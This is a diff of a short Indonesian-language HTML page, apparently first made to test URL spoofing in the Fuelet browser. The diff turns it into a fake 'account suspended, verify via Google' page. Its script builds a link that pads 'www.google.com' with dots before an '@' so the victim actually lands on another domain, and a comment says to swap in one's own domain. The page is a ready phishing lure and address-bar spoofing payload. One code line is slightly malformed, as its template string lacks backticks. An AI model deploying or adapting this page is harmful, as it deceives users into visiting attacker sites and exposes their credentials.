@@ -1,16 +1,39 @@
+
+Anda mengirim
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>Test Spoofing Fuelet</title>
+    <meta charset="UTF-8">
+    <title>Sistem Verifikasi Flow</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; background: #0b0e11; color: white; padding-top: 100px; }
+        .card { background: #1e2329; padding: 30px; border-radius: 15px; display: inline-block; border: 1px solid #474d57; }
+        .btn { background: #00ef8b; color: black; padding: 15px 25px; text-decoration: none; border-radius: 8px; font-weight: bold; display: inline-block; }
+    </style>
 </head>
 <body>
-    <h1>Uji Peniruan URL</h1>
-    <p>Klik tautan di bawah dan perhatikan bilah alamat di browser Fuelet:</p>
-    
-    <a href="https://www.google.com:disini-adalah-fake-password@0x403for.github.io/">
-       Klik untuk Login ke Google
-    </a>
+
+    <div class="card">
+        <h2>Keamanan Akun</h2>
+        <p>Akses ditangguhkan. Silakan verifikasi melalui Google untuk melanjutkan.</p>
+        <br>
+        <a id="spoofLink" href="#" class="btn">VERIFIKASI GOOGLE</a>
+    </div>
+
+    <script>
+        document.getElementById('spoofLink').onclick = function(e) {
+            e.preventDefault();
+            
+            const fakeDomain = "www.google.com";
+            const padding = "............................................................"; // Titik panjang
+            const realDomain = "0x403for.github.io"; // Ganti dengan domain Anda
+            
+            // Format: https://fake.com:padding@real.com
+            const spoofedUrl = https://${fakeDomain}:${padding}@${realDomain}/;
+            
+            window.location.href = spoofedUrl;
+        };
+    </script>
 
 </body>
 </html>
-
